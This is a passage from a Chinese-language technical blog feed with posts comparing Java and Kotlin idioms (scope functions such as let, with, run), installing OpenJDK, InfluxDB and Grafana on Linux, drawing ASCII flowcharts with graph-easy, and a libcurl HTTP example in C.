class="line"></span><br><span class="line">        <span class="keyword">if</span> (age != developer.age) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.equals(developer.name) : developer.name == <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = name != <span class="keyword">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + age;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Developer&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">Developer</span></span>(<span class="keyword">val</span> name: String, <span class="keyword">val</span> age: <span class="built_in">Int</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="原型扩展"><a href="#原型扩展" class="headerlink" title="原型扩展"></a>原型扩展</h2><ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Utils</span><span class="params">()</span> </span>&#123; </span><br><span class="line">      <span class="comment">// This utility class is not publicly instantiable </span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">triple</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span> * value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = Utils.triple(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="built_in">Int</span>.<span class="title">triple</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span> * <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = <span class="number">3</span>.triple()</span><br></pre></td></tr></table></figure>
<ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Direction &#123;</span><br><span class="line">        NORTH(<span class="number">1</span>),</span><br><span class="line">        SOUTH(<span class="number">2</span>),</span><br><span class="line">        WEST(<span class="number">3</span>),</span><br><span class="line">        EAST(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> direction;</span><br><span class="line"></span><br><span class="line">        Direction(<span class="keyword">int</span> direction) &#123;</span><br><span class="line">            <span class="keyword">this</span>.direction = direction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDirection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> direction;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">Direction</span></span>(<span class="keyword">val</span> direction: <span class="built_in">Int</span>) &#123;</span><br><span class="line">    NORTH(<span class="number">1</span>),</span><br><span class="line">    SOUTH(<span class="number">2</span>),</span><br><span class="line">    WEST(<span class="number">3</span>),</span><br><span class="line">    EAST(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="let内联函数"><a href="#let内联函数" class="headerlink" title="let内联函数"></a>let内联函数</h2><ul>
<li>Kotlin<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> result = <span class="string">"testLet"</span>.let &#123;</span><br><span class="line">    println(it.length)</span><br><span class="line">    <span class="number">1000</span></span><br><span class="line">&#125;</span><br><span class="line">println(result) <span class="comment">//1000</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>场景一: 最常用的场景就是使用let函数处理需要针对一个可null的对象统一做判空处理。<br>场景二: 然后就是需要去明确一个变量所处特定的作用域范围内可以使用</p>
<ul>
<li>Kotlin</li>
</ul>
<p>不用let<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">mVideoPlayer?.setVideoView(activity.course_video_view)</span><br><span class="line">mVideoPlayer?.setControllerView(activity.course_video_controller_view)</span><br><span class="line">mVideoPlayer?.setCurtainView(activity.course_video_curtain_view)</span><br></pre></td></tr></table></figure></p>
<p>用let<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">mVideoPlayer?.let &#123;</span><br><span class="line">   it.setVideoView(activity.course_video_view)</span><br><span class="line">   it.setControllerView(activity.course_video_controller_view)</span><br><span class="line">   it.setCurtainView(activity.course_video_curtain_view)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="also内联函数"><a href="#also内联函数" class="headerlink" title="also内联函数"></a>also内联函数</h2><p>also函数和let差不多，also返回传入对象，let返回最后一行的值。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> result = <span class="string">"testAlso"</span>.also &#123;</span><br><span class="line">    println(it.length)</span><br><span class="line">    <span class="number">1000</span></span><br><span class="line">&#125;</span><br><span class="line">println(result) <span class="comment">//testAlso</span></span><br></pre></td></tr></table></figure>
<h2 id="with内联函数"><a href="#with内联函数" class="headerlink" title="with内联函数"></a>with内联函数</h2><p>with函数是接收了两个参数，分别为T类型的对象和一个lambda函数块，所以with函数最原始样子:<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> result = with(user, &#123;</span><br><span class="line">    println(<span class="string">"my name is <span class="variable">$name</span>, I am <span class="variable">$age</span> years old, my phone number is <span class="variable">$phoneNum</span>"</span>)</span><br><span class="line">    <span class="number">1000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>最后一行的 ‘1000’ 返回值赋值给 ‘result’</p>
</blockquote>
<p>但是由于with函数最后一个参数是一个函数，可以把函数提到圆括号的外部，所以最终with函数的调用形式:<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> result = with(user) &#123;</span><br><span class="line">    println(<span class="string">"my name is <span class="variable">$name</span>, I am <span class="variable">$age</span> years old, my phone number is <span class="variable">$phoneNum</span>"</span>)</span><br><span class="line">    <span class="number">1000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用场景：<br>适用于调用同一个类的多个方法时，可以省去类名重复，直接调用类的方法即可，经常用于Android中RecyclerView中onBinderViewHolder中，数据model的属性映射到UI上</p>
<ul>
<li>Java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(ViewHolder holder, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   		MyItem item = getItem(position);</span><br><span class="line">		<span class="keyword">if</span> (item == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		holder.tvTitle.setText(item.title);</span><br><span class="line">		holder.tvDate.setText(item.date);</span><br><span class="line">		holder.tvInfo.setText(item.info);</span><br><span class="line">		holder.tvCount.setText(item.count);</span><br><span class="line">		...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Kotlin<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onBindViewHolder</span><span class="params">(holder: <span class="type">ViewHolder</span>, position: <span class="type">Int</span>)</span></span>&#123;</span><br><span class="line">   <span class="keyword">val</span> item = getItem(position)?: <span class="keyword">return</span></span><br><span class="line">   </span><br><span class="line">   with(item)&#123;</span><br><span class="line">       holder.tvTitle.text = title</span><br><span class="line">	   holder.tvDate.text = date</span><br><span class="line">	   holder.tvInfo.text = info</span><br><span class="line">	   holder.tvCount.text = count</span><br><span class="line">       ...   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="run内联函数"><a href="#run内联函数" class="headerlink" title="run内联函数"></a>run内联函数</h2><p>run函数实际上可以说是let和with两个函数的结合体，run函数只接收一个lambda函数为参数，以闭包形式返回，返回值为最后一行的值或者指定的return的表达式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">val user = User(&quot;Kotlin&quot;, 1, &quot;1111111&quot;)</span><br><span class="line"></span><br><span class="line">val result = user.run &#123;</span><br><span class="line">    println(&quot;my name is $name, I am $age years old, my phone number is $phoneNum&quot;)</span><br><span class="line">    1000</span><br><span class="line">&#125;</span><br><span class="line">println(&quot;result: $result&quot;)</span><br></pre></td></tr></table></figure></p>
<p>适用于let,with函数任何场景。因为run函数是let,with两个函数结合体，准确来说它弥补了let函数在函数体内必须使用it参数替代对象，在run函数中可以像with函数一样可以省略，直接访问实例的公有属性和方法，另一方面它弥补了with函数传入对象判空问题，在run函数中可以像let函数一样做判空处理。</p>
<ul>
<li>Kotlin<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onBindViewHolder</span><span class="params">(holder: <span class="type">ViewHolder</span>, position: <span class="type">Int</span>)</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">   getItem(position)?.run&#123;</span><br><span class="line">       holder.tvTitle.text = title</span><br><span class="line">	   holder.tvDate.text = date</span><br><span class="line">	   holder.tvInfo.text = info</span><br><span class="line">	   holder.tvCount.text = count</span><br><span class="line">       ...   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="apply内联函数"><a href="#apply内联函数" class="headerlink" title="apply内联函数"></a>apply内联函数</h2><p>和run差不多，apply返回的是对象本身。<br>使用场景：实例化一个对象，对属性进行赋值</p>
]]></content>
      <categories>
        <category>Kotlin</category>
      </categories>
      <tags>
        <tag>kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>ASCII 流程图生成方法</title>
    <url>/Linux/ASCII%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    <content><![CDATA[<p>markdown文档很多时候要流程图，不用图片，用字符就可以显示，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+--------+  request   +--------+</span><br><span class="line">| client | ---------&gt; | server |</span><br><span class="line">+--------+            +--------+</span><br></pre></td></tr></table></figure>
<p>那么如何画这种图？</p>
<h3 id="Easy-DSL的语法描述图像"><a href="#Easy-DSL的语法描述图像" class="headerlink" title="Easy DSL的语法描述图像"></a>Easy DSL的语法描述图像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install libgraph-easy-perl</span></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> graph-easy &lt;&lt;&lt; <span class="string">'[ client ] - request -&gt; [ server ]'</span></span></span><br><span class="line">+--------+  request   +--------+</span><br><span class="line">| client | ---------&gt; | server |</span><br><span class="line">+--------+            +--------+</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim simple.txt</span></span><br><span class="line">[ A ], [ B ], [ C ] --&gt; [ D ]</span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> graph-easy simple.txt</span></span><br><span class="line">+---+     +---+     +---+</span><br><span class="line">| A | --&gt; | D | &lt;-- | C |</span><br><span class="line">+---+     +---+     +---+</span><br><span class="line">            ^</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">          +---+</span><br><span class="line">          | B |</span><br><span class="line">          +---+</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000011993254" target="_blank" rel="noopener">Easy DSL的语法</a> </p>
<p><a href="https://www.jianshu.com/p/1f0b295874eb" target="_blank" rel="noopener">Easy DSL的语法</a> </p>
<h3 id="图形工具"><a href="#图形工具" class="headerlink" title="图形工具"></a>图形工具</h3><p>此 <a href="http://asciiflow.com" target="_blank" rel="noopener">asciiflow</a> 网站提供在线画图。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>md</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS安装OpenJDK</title>
    <url>/Linux/CentOS%E5%AE%89%E8%A3%85OpenJDK/</url>
    <content><![CDATA[<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>CentOS会自带OpenJDK，卸载自带的OpenJDK，再安装我们需要的版本<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ rpm -qa | grep jdk</span><br><span class="line"></span><br><span class="line">java-11-openjdk-headless-11.0.4.11-1.el7_7.x86_64</span><br><span class="line">java-1.8.0-openjdk-headless-1.8.0.222.b10-0.el7_6.x86_64</span><br><span class="line">copy-jdk-configs-3.3-10.el7_5.noarch</span><br><span class="line"></span><br><span class="line">$ rpm -e --nodeps java-1.8.0-openjdk-headless-1.8.0.222.b10-0.el7_6.x86_64</span><br><span class="line">$ rpm -e --nodeps java-11-openjdk-headless-11.0.4.11-1.el7_7.x86_64</span><br><span class="line">$ rpm -e --nodeps copy-jdk-configs-3.3-10.el7_5.noarch</span><br></pre></td></tr></table></figure></p>
<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ yum search openjdk | grep -i --color openjdk</span><br></pre></td></tr></table></figure>
<p><img src="/images/linux/openjdk.png" alt="搜索结果"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装java8</span></span><br><span class="line">$ yum install java-1.8.0-openjdk  java-1.8.0-openjdk-devel</span><br><span class="line"><span class="comment"># 安装java11</span></span><br><span class="line">$ yum install java-11-openjdk  java-11-openjdk-devel</span><br><span class="line"></span><br><span class="line">$ java -version</span><br><span class="line">openjdk version <span class="string">"11.0.4"</span> 2019-07-16 LTS</span><br><span class="line">OpenJDK Runtime Environment 18.9 (build 11.0.4+11-LTS)</span><br><span class="line">OpenJDK 64-Bit Server VM 18.9 (build 11.0.4+11-LTS, mixed mode, sharing)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>InfluxDB安装</title>
    <url>/Linux/InfluxDB%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<blockquote>
<p>InfluxDB®是一款专门处理高写入和查询负载的时序数据库，无需外部依赖，用于存储大规模的时序数据并进行实时分析，包括来自DevOps监控、应用指标和IoT传感器上的数据。</p>
</blockquote>
<h2 id="20190423版本问题"><a href="#20190423版本问题" class="headerlink" title="20190423版本问题"></a>20190423版本问题</h2><ul>
<li>InfluxDB从v1.3开始取消自带的web页面，要web页面的可以安装v1.2.4版。</li>
<li>目前为止，v1.7.6是最新稳定版， <a href="https://docs.influxdata.com/influxdb/v1.7/introduction/getting-started" target="_blank" rel="noopener">《1.x的文档》</a></li>
<li>v2.0 alpha ，<a href="https://v2.docs.influxdata.com/v2.0" target="_blank" rel="noopener">《2.0的文档》</a> </li>
</ul>
<p>本文安装的是 v1.7.6</p>
<h2 id="Docker-Image-安装"><a href="#Docker-Image-安装" class="headerlink" title="Docker Image 安装"></a>Docker Image 安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker pull influxdb</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 8083:8083 -p8086:8086 --expose 8090 --expose 8099 --name influxDbService influxdb</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it &#123;CONTAINER ID&#125; bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> influxd version</span></span><br><span class="line">InfluxDB v1.7.6 (git: 1.7)</span><br></pre></td></tr></table></figure>
<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><h5 id="1-apt-get安装"><a href="#1-apt-get安装" class="headerlink" title="1. apt-get安装"></a>1. apt-get安装</h5><p><a href="https://docs.influxdata.com/influxdb/v1.7/introduction/installation" target="_blank" rel="noopener">v1.7安装文档</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 加入 InfluxData repository</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget -qO- https://repos.influxdata.com/influxdb.key | sudo apt-key add -</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> /etc/lsb-release</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"deb https://repos.influxdata.com/<span class="variable">$&#123;DISTRIB_ID,,&#125;</span> <span class="variable">$&#123;DISTRIB_CODENAME&#125;</span> stable"</span> | sudo tee /etc/apt/sources.list.d/influxdb.list</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装启动</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update &amp;&amp; sudo apt-get install influxdb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo service influxdb start</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者用systemctl启动</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl unmask influxdb.service</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start influxdb</span></span><br></pre></td></tr></table></figure>
<h5 id="2-DEB包安装"><a href="#2-DEB包安装" class="headerlink" title="2. DEB包安装"></a>2. DEB包安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.influxdata.com/influxdb/releases/influxdb_1.7.6_amd64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i influxdb_1.7.6_amd64.deb</span></span><br></pre></td></tr></table></figure>
<h2 id="CentOS-RPM包安装"><a href="#CentOS-RPM包安装" class="headerlink" title="CentOS RPM包安装"></a>CentOS RPM包安装</h2><h5 id="1-YUM安装"><a href="#1-YUM安装" class="headerlink" title="1. YUM安装"></a>1. YUM安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt;&lt;EOF | sudo tee /etc/yum.repos.d/influxdb.repo</span></span><br><span class="line">[influxdb]</span><br><span class="line">name = InfluxDB Repository - RHEL \$releasever</span><br><span class="line">baseurl = https://repos.influxdata.com/rhel/\$releasever/\$basearch/stable</span><br><span class="line">enabled = 1</span><br><span class="line">gpgcheck = 1</span><br><span class="line">gpgkey = https://repos.influxdata.com/influxdb.key</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum install influxdb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo service influxdb start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start influxdb</span></span><br></pre></td></tr></table></figure>
<h5 id="2-RPM包安装"><a href="#2-RPM包安装" class="headerlink" title="2. RPM包安装"></a>2. RPM包安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.influxdata.com/influxdb/releases/influxdb-1.7.6.x86_64.rpm</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum localinstall influxdb-1.7.6.x86_64.rpm</span></span><br></pre></td></tr></table></figure>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://dl.influxdata.com/influxdb/releases/influxdb-1.7.6_windows_amd64.zip</span><br><span class="line">unzip influxdb-1.7.6_windows_amd64.zip</span><br></pre></td></tr></table></figure>
<h2 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> brew update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> brew install influxdb</span></span><br></pre></td></tr></table></figure>
<h2 id="Grafana数据可视化"><a href="#Grafana数据可视化" class="headerlink" title="Grafana数据可视化"></a>Grafana数据可视化</h2><p>可视化的监控展示服务，提供包括折线图，饼图，仪表盘等多种监控数据可视化UI，支持多种不同的时序数据库数据源，Grafana对每种数据源提供不同的查询方法，而且能很好的支持每种数据源的特性。</p>
<p>系统默认用户名和密码为admin/admin，第一次登录要求修改密码。设置好数据源，就可以配置各种呈现表图来展示数据。</p>
<blockquote>
<p>注意：Grafana是用来展示数据的，不是做增删改查的工具。</p>
</blockquote>
<p><a href="https://grafana.com/grafana/download" target="_blank" rel="noopener">Download Grafana</a></p>
<h5 id="1-docker"><a href="#1-docker" class="headerlink" title="1. docker"></a>1. docker</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d --name=grafana -p 3000:3000 grafana/grafana</span></span><br></pre></td></tr></table></figure>
<h5 id="2-ubuntu"><a href="#2-ubuntu" class="headerlink" title="2. ubuntu"></a>2. ubuntu</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.grafana.com/oss/release/grafana_6.1.4_amd64.deb </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i grafana_6.1.4_amd64.deb</span></span><br></pre></td></tr></table></figure>
<h5 id="3-centos"><a href="#3-centos" class="headerlink" title="3. centos"></a>3. centos</h5>   <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.grafana.com/oss/release/grafana-6.1.4-1.x86_64.rpm </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum localinstall grafana-6.1.4-1.x86_64.rpm</span></span><br></pre></td></tr></table></figure>
<h2 id="命令行操作数据库"><a href="#命令行操作数据库" class="headerlink" title="命令行操作数据库"></a>命令行操作数据库</h2><p><a href="https://docs.influxdata.com/influxdb/v1.7/introduction/getting-started" target="_blank" rel="noopener">《文档手册地址》</a> 都是一些创建数据之类的命令行操作，但也可以通过InfluxDB的HTTP API进行客户端 - 服务器通信，端口8086。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> influx -precision rfc3339</span></span><br><span class="line">Connected to http://localhost:8086 version 1.7.6</span><br><span class="line">InfluxDB shell version: 1.7.6</span><br><span class="line">Enter an InfluxQL query</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show databases</span></span><br><span class="line">name: databases</span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">_internal</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> create database mydb</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show databases</span></span><br><span class="line">name: databases</span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">_internal</span><br><span class="line">mydb</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> use mydb</span></span><br><span class="line">Using database mydb</span><br><span class="line"><span class="meta">#</span><span class="bash">measurements相当于mysql的表</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show measurements</span></span><br><span class="line"><span class="meta">#</span><span class="bash">插入数据并指定（创建）measurements</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> insert disk_free,hostname=server01 value=12121212</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> show measurements</span></span><br><span class="line">name: measurements</span><br><span class="line">name</span><br><span class="line">----</span><br><span class="line">disk_free</span><br></pre></td></tr></table></figure>
<h2 id="编程库"><a href="#编程库" class="headerlink" title="编程库"></a>编程库</h2><p>在 <a href="https://github.com/influxdata" target="_blank" rel="noopener">github.com/influxdata</a> 可以找到你的语言的 library，比如Java的 <a href="https://github.com/influxdata/influxdb-java" target="_blank" rel="noopener">Java Client Library</a> ，可以看到有些library已经有了 1.x 和 2.x 的版本区分了，这个要注意一下。</p>
<p>Golang的客户端库已经迁移了，不在 <code>influxdata/influxdb</code> 下了，详细可以看 <a href="https://github.com/influxdata/influxdb/issues/11035" target="_blank" rel="noopener">issues</a> 。</p>
<p>Go这样引用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import "github.com/influxdata/influxdb1-client/v2"</span><br><span class="line"></span><br><span class="line">go get github.com/influxdata/influxdb1-client/v2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux下C语言HTTP通讯库</title>
    <url>/Linux/Linux%E4%B8%8BC%E8%AF%AD%E8%A8%80HTTP%E9%80%9A%E8%AE%AF%E5%BA%93/</url>
    <content><![CDATA[<p>很多嵌入式设备都有接入网络的功能，那么在Linux下的C，用什么HTTP库比较合适呢？嵌入式设备资源都比较紧张，大的库肯定不是一个好的选择。<br>由于不是专业的，只能找到以下库：</p>
<ul>
<li><p><a href="https://curl.haxx.se/download.html" target="_blank" rel="noopener">libcurl</a><br>curl-7.56.1.zip 大小是5.27MB,里面包含了supporting HTTP, HTTPS, FTP, FTPS, GOPHER, TFTP, SCP, SFTP, SMB, TELNET, DICT, LDAP, LDAPS, FILE, IMAP, SMTP, POP3, RTSP and RTMP. 所以能精简出来HTTP是没有5.27MB那么大。</p>
<p>而且一般linux系统都带有curl的库，c语言可以直接引入curl的头文件。</p>
<p><a href="http://blog.csdn.net/cy_cai/article/details/41941161" target="_blank" rel="noopener">libcurl基本知识post和get请求</a></p>
<p><a href="http://blog.csdn.net/mao834099514/article/details/54947625" target="_blank" rel="noopener">c/c++调用libcurl库发送http请求的两种基本用法</a></p>
<p>示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CURL *curl;             <span class="comment">//定义CURL类型的指针</span></span><br><span class="line">    CURLcode res;           <span class="comment">//定义CURLcode类型的变量，保存返回状态码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: file &lt;url&gt;;\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl = curl_easy_init();       <span class="comment">//初始化一个CURL类型的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(curl!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//设置curl选项.其中CURLOPT_URL是让用户指定url.argv[1]中存放的命令行传进来的网址</span></span><br><span class="line">        curl_easy_setopt(curl,CURLOPT_URL, argv[<span class="number">1</span>]);       </span><br><span class="line">        <span class="comment">//调用curl_easy_perform执行我们的设置.并进行相关的操作.在这里只在屏幕上显示出来.</span></span><br><span class="line">        res = curl_easy_perform(curl);</span><br><span class="line">        <span class="comment">//清除curl操作.</span></span><br><span class="line">        curl_easy_cleanup(curl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
